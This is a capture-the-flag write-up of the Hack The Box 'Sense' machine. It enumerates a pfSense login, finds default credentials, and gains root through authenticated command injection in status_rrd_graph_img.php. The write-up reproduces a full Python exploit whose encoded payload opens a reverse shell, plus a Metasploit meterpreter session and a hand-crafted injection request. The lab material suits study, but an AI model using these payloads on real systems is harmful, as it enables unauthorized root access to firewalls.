# References
1. [Sense Writeup (v3ded.github.io)](https://v3ded.github.io/ctf/htb-sense)
2. [Sense Video (IppSec youtube.com)](https://www.youtube.com/watch?v=d2nVDoVr0jE&ab_channel=IppSec)

# Summary
### 1. NMAP
x

### 2. Port 443 HTTPS Enumeration
x

### 3. Port 443 HTTPS Exploration with Credentials
x

### 4. Port 443 Command Injection Exploit (Python Script)
x

### 5. Alternative Port 443 Command Injection Exploit (Metasploit)
x

### 6. Alternative Port 443 Command Injection Exploit (BurpSuite)
x

# Attack
## 1. NMAP
Quick scan.
```
hippoeug@kali:~$ nmap 10.129.140.47 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 15:04 +08
...
Scanning 10.129.140.47 [1000 ports]
Discovered open port 80/tcp on 10.129.140.47
Discovered open port 443/tcp on 10.129.140.47
...
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.129.140.47/
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Public Key type: rsa                                                                                                                                                
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-14T19:21:35
| Not valid after:  2023-04-06T19:21:35
| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622
|_SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02
|_ssl-date: TLS randomness does not represent time
...
```
Only 2 opened ports, nice.

And vulnerability scan.
```
hippoeug@kali:~$ nmap --script vuln 10.129.140.47 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 15:12 +08
...
Scanning 10.129.140.47 [1000 ports]
Discovered open port 443/tcp on 10.129.140.47
Discovered open port 80/tcp on 10.129.140.47
...
PORT    STATE SERVICE
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open  https
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Non-safe prime
|             Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: 
...
```
Ooh! Lots of results on Port 443 HTTPS, lets KIV them.

## 2. Port 443 HTTPS Enumeration
A visit to Port 80 `http://10.129.140.47`, but we get redirected to Port 443 `https://10.129.140.47`.

![443](https://user-images.githubusercontent.com/21957042/116856129-29d0fd00-ac2d-11eb-934c-30e76f9d70d6.png)

Ah, a pfSense login page. Smells like one of the machines where we need to find credentials to exploit.

Let's take a quick look at the page source.
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
	<head>
		<script type="text/javascript" src="/javascript/jquery.js"></script>
		<script type="text/javascript">
		//<![CDATA[
		$(document).ready(function() { jQuery('#usernamefld').focus(); });
		//]]>
		</script>
    
    ...

    function init() {
      if(jQuery('#submit') && ! noAjaxOnSubmit) {
        // debugging helper
        //alert('adding observe event for submit button');
        
        jQuery("#submit").click(submit_form);
        jQuery('#submit').click(function() {return false;});
        var to_insert = "<div style='visibility:hidden' id='loading' name='loading'><img src='/themes/pfsense_ng/images/misc/loader.gif' alt='loader' \/><\/div>";
        jQuery('#submit').before(to_insert);
      }
    }
    
    function submit_form(e){
      // debugging helper
      //alert(Form.serialize($('iform')));

      if(jQuery('#inputerrors'))
        jQuery('#inputerrors').html('<center><b><i>Loading...<\/i><\/b><\/center>');
        
      /* dsh: Introduced because pkg_edit tries to set some hidden fields
       *      if executing submit's onclick event. The click gets deleted
       *      by Ajax. Hence using onkeydown instead.
       */
      if(jQuery('#submit').prop('keydown')) {
        jQuery('#submit').keydown();
        jQuery('#submit').css('visibility','hidden');
      }
      if(jQuery('#cancelbutton'))
        jQuery('#cancelbutton').css('visibility','hidden');
      jQuery('#loading').css('visibility','visible');
      // submit the form using Ajax
    }
   
    function formSubmitted(resp) {
      var responseText = resp.responseText;
      
      // debugging helper
      // alert(responseText);
      
      if(responseText.indexOf('html') > 0) {
        /* somehow we have been fed an html page! */
        //alert('Somehow we have been fed an html page! Forwarding to /.');
        document.location.href = '/';
      }
      
      eval(responseText);
    }
    
    /* this function will be called if an HTTP error will be triggered */
    function formFailure(resp) {
	    showajaxmessage(resp.responseText);
		if(jQuery('#submit'))
		  jQuery('#submit').css('visibility','visible');
		if(jQuery('#cancelbutton'))
		  jQuery('#cancelbutton').css('visibility','visible');
		if(jQuery('#loading'))
		  jQuery('#loading').css('visibility','hidden');

    }
    
    ...
    
				<p>
					<span style="text-align:center">
						<input type="submit" name="login" class="formbtn" value="Login" tabindex="3" />
					</span>
				</p>
			</form>
		</div>
	<script type="text/javascript">CsrfMagic.end();</script></body>
</html>
```
Hmm, lots of comments on the page source that I'm not expecting from a software like pfSense.

Let's do a quick Gobuster with `-f` flag that adds a slash to the back of the query and see what we get.
```
hippoeug@kali:~$ gobuster dir -u "https://10.129.140.47" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -f
...
Error: error on running goubster: unable to connect to https://10.129.140.47/: invalid certificate: x509: cannot validate certificate for 10.129.140.47 because it doesn't contain any IP SANs
```
Let's fix the invalid certificate error by adding a `-k` flag to ignore the errors.
```
hippoeug@kali:~$ gobuster dir -u "https://10.129.140.47" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -f -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.129.140.47
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Add Slash:      true
[+] Timeout:        10s
===============================================================
2021/05/03 15:20:22 Starting gobuster
===============================================================
/tree/ (Status: 200)
/installer/ (Status: 302)
===============================================================
2021/05/03 15:33:08 Finished
===============================================================
```
Hmm, two directories, `/tree/` and `/installer/`.

Let's visit them. First to `https://10.129.140.47/tree/`

![tree](https://user-images.githubusercontent.com/21957042/116856135-2b9ac080-ac2d-11eb-9aaa-cf189f9bce70.png)

Looks like some default site. And the other, `https://10.129.140.47/installer/`. But we got redirected to `https://10.129.140.47/installer/installer.php`.

![installer](https://user-images.githubusercontent.com/21957042/116856134-2b022a00-ac2d-11eb-9329-05e240324a9b.png)

Ah nothing interesting on this particular page. However, we have one final trick up our sleeve from the previous machine [Shocker](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Shocker.md).

We could run the Gobuster to look for files itself, let's see if we get anything. Files we are looking for include `.cgi`, `.sh`, `.pl`, `.py`, `.php` & `.txt` files.
```
hippoeug@kali:~$ gobuster dir -u "https://10.129.140.47" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -f -k -x cgi,sh,pl,py,php,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.129.140.47
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,cgi,sh,pl,py
[+] Add Slash:      true
[+] Timeout:        10s
===============================================================
2021/05/03 17:44:41 Starting gobuster
===============================================================
/help.php (Status: 200)
/index.php (Status: 200)
/stats.php (Status: 200)
/edit.php (Status: 200)
/system.php (Status: 200)
/license.php (Status: 200)
/status.php (Status: 200)
/changelog.txt (Status: 200)
/exec.php (Status: 200)
/graph.php (Status: 200)
/tree/ (Status: 200)
/wizard.php (Status: 200)
/pkg.php (Status: 200)
/installer/ (Status: 302)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/system-users.txt (Status: 200)
===============================================================
2021/05/03 19:09:24 Finished
===============================================================
```
Dang, this took quite some time to run but actually showed some new useful stuff. We could run with slightly more threads next time. Let's explore these files.

Unfortuantely, most of these `.php` files all lead back to the original pfSense login page and wasn't useful. We will use the `/help.php` as an example.

![help](https://user-images.githubusercontent.com/21957042/116892323-4dfb0100-ac62-11eb-8491-e59899e6cd57.png)

Another file `/xmlrpc.php` was different, but wasn't useful.

![xmlrpc](https://user-images.githubusercontent.com/21957042/116892328-4f2c2e00-ac62-11eb-9f54-0de097f0c6df.png)

There are also two other `.txt` files. Let's take a look at `https://10.129.140.47/changelog.txt` first.
```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```
Ooh, interesting stuff. Too bad this f\*\*ker didn't tell us what the vulnerability is.

And the other file at `https://10.129.140.47/system-users.txt`.
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```
Credentials! Username `Rohit` and password `company defaults` hehe, that's always fun.

## 3. Port 443 HTTPS Exploration with Credentials
Let's try to login to the pfSense page at `https://10.129.140.47` with the credentials we just got, username `Rohit` and password `company defaults`.

![invalid](https://user-images.githubusercontent.com/21957042/116894558-ca8edf00-ac64-11eb-8f4f-f4b9de743ef5.png)

We got a "Username or Password incorrect" error. 

Maybe the password is pfSense's defualt password, which is just `pfsense` when we googled. Let's try username `Rohit` and password `pfsense`. But still we got a "Username or Password incorrect" error.

Turns out, the username must also be lowered-case. So username `rohit` and password `pfsense`. Damn it Rohito! With this credentials, we have access to the pfSense Dashboard.

![page](https://user-images.githubusercontent.com/21957042/116896021-610fd000-ac66-11eb-81a9-a337f07ca365.png)

Doing some exploration, we can see that the version of the pfSense is `2.1.3-RELEASE`.

With this, we can do a Searchsploit.
```
hippoeug@kali:~$ searchsploit pfsense 2.1.3
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                      | php/webapps/43560.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Cool! We could try this `43560.py` script, a Command Injection exploit.

As usual, we will also do a quick Google in case we miss out something obvious. Searching for "pfsense 2.1.3 exploit", we see the same result [43560.py](https://www.exploit-db.com/exploits/43560).

## 4. Port 443 Command Injection Exploit (Python Script)
Let's download the script and give it a shot.
```
hippoeug@kali:~$ searchsploit -m 43560.py
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/43560.py
```
Let's also take a quick look at the code to know what we need to run the script.
```
#!/usr/bin/env python3

# Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
# Date: 2018-01-12
# Exploit Author: absolomb
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/
# Version: <=2.1.3
# Tested on: FreeBSD 8.3-RELEASE-p16
# CVE : CVE-2014-4688

import argparse
import requests
import urllib
import urllib3
import collections

'''
pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
This script will return a reverse shell on specified listener address and port.
Ensure you have started a listener to catch the shell before running!
'''

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument('--lhost', help = 'Local Host listener')
parser.add_argument('--lport', help = 'Local Port listener')
parser.add_argument("--username", help = "pfsense Username")
parser.add_argument("--password", help = "pfsense Password")
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password


# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)


payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]

# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)

# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

client = requests.session()

# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)

	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]

except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)
else:
	print("No CSRF token!")
	exit()

if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
			if exploit_request.status_code:
				print("Error running exploit")
		except:
			print("Exploit completed")
```
We will need to supply the usual stuff; rhost, lhost, lport and credentials.

Let's start a nc listener and run the exploit.
```
hippoeug@kali:~$ python3 43560.py --rhost 10.129.143.86 --lhost 10.10.x.x --lport 4545 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```
Seems successful. Let's take a look at our nc listener.
```
hippoeug@kali:~$ nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.10.x.x] from (UNKNOWN) [10.129.143.86] 25934
sh: can't access tty; job control turned off
# pwd
/var/db/rrd
# whoami
root
...
# pwd
/home/rohit
# ls
.tcshrc
user.txt
# cat user.txt
8721327cc232073b40d27d9c17e7348b# cd ..
...
# pwd
/root
# ls
.cshrc
.first_time
.gitsync_merge.sample
.hushlogin
.login
.part_mount
.profile
.shrc
.tcshrc
root.txt
# cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
```
We got both user and root flags without the need of any privilege escalation!

## 5. Alternative Port 443 Command Injection Exploit (Metasploit)
Apparently, there is a Metasploit module written for this `pfSense 2.1.3-RELEASE`. Doing a Google search, we see a result of the [Metasploit module](https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec/).

We also do a search on Metasploit.
```
hippoeug@kali:~$ msfconsole
msf6 > search pfsense

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
   1  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
   2  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE
```
We see the same Metasploit module `exploit/unix/http/pfsense_graph_injection_exec`, so let's use it.
```
msf6 > use exploit/unix/http/pfsense_graph_injection_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_graph_injection_exec) > set rhost 10.129.85.110
rhost => 10.129.85.110
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set username rohit
username => rohit
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(unix/http/pfsense_graph_injection_exec) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (39282 bytes) to 10.129.85.110
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.85.110:48852) at 2021-05-12 06:12:39 +0800
[+] Deleted fBpI

meterpreter > getuid
Server username: root (0)
```
Meterpreter shell with root privileges.

## 6. Alternative Port 443 Command Injection Exploit (BurpSuite)
While doing a Google search for `pfSense 2.1.3-RELEASE` exploits, we come across a [Source](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/) that details the pfSense authenticated graph status RCE.

Quoting one of the sources: "pfSense, a free BSD based open source firewall distribution, versions 2.2.6 and below contain a remote command execution vulnerability post authentication in the `\_rrd_graph_img.php` page. The vulnerability occurs via the graph GET parameter. A non-administrative authenticated attacker can inject arbitrary operating system commands and execute them as the root user. Verified against 2.1.3.".

In [IppSec's video](https://www.youtube.com/watch?v=d2nVDoVr0jE&ab_channel=IppSec), he goes through this exploit in detail too.

In short, there is a GET request to `$curdatabase`, and later on in the pfSense code, this variable will be executed. Here is where the command execution is exploited.
```
if ($_GET['database']) {
	$curdatabase = basename($_GET['database']);
} 
else {
	$curdatabase = "wan-traffic.rrd";
}
...
if(strstr($curdatabase, "queues")) {
	...
	exec("/bin/rm -f $rrddbpath$curdatabase");
	Flush();
	Usleep(500);
	enable_rrd_graphing();
}
```
Let's get started.

Since we saw that the exploit is related to `\_rrd_graph_img.php` page, we navigate around the pfSense page to find it under Status.

![graph](https://user-images.githubusercontent.com/21957042/118416169-f4261c80-b6e0-11eb-9079-77431093d8e9.png)
![graph2](https://user-images.githubusercontent.com/21957042/118416171-f5574980-b6e0-11eb-95bc-3ff43895c961.png)

We can see the URL is `https://10.129.146.60/status_rrd_graph.php`, not exactly what we want to see.

However, if we right click on the image and "View Image" instead, we see that the URL `https://10.129.146.60/status_rrd_graph_img.php?start=1621149559&graph=eight_hour&database=system-processor.rrd&style=inverse&tmp=10` looks exploitable.

![graph3](https://user-images.githubusercontent.com/21957042/118416172-f5efe000-b6e0-11eb-8a4f-d40c58eef74b.png)
![graph4](https://user-images.githubusercontent.com/21957042/118416173-f6887680-b6e0-11eb-99a6-2a846a831aaf.png)

Cool. Now let's just fire up Burpsuite, setup the proxy settings correctly, and reload the page.

We see it on Proxy Intercept, and we click on Actions and sent it to Repeater instead.

![burpsendtorepeater](https://user-images.githubusercontent.com/21957042/118416174-f7210d00-b6e0-11eb-84cb-b55452543d5e.png)

From here, let's modify the GET request to try putting a text file in the system. We will change the GET to `GET /status_rrd_graph_img.php?database=queues;echo+"CMD+INJECT">cmd.txt HTTP/1.1`.

![repeater2](https://user-images.githubusercontent.com/21957042/118416179-f8ead080-b6e0-11eb-8ecb-a8110b40222a.png)

After this is done, let's navigate to the file `https://10.129.73.176/cmd.txt` we created to see if we see it.

![notfound](https://user-images.githubusercontent.com/21957042/118416178-f8523a00-b6e0-11eb-83c2-9f08582e4ce9.png)

Unfortunately, we get a `404 - Not Found` error. This is probably because we are in the wrong directory `/var/db/rrd`, and we won't be able to access this file at `/var/db/rrd/cmd.txt` from the browser.

If we wanted, we could do `queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"CMD+INJECT">cmd.txt`, navigating to the pfSense DocumentRoot folder which is on path `/usr/local/www/cmd.txt`.
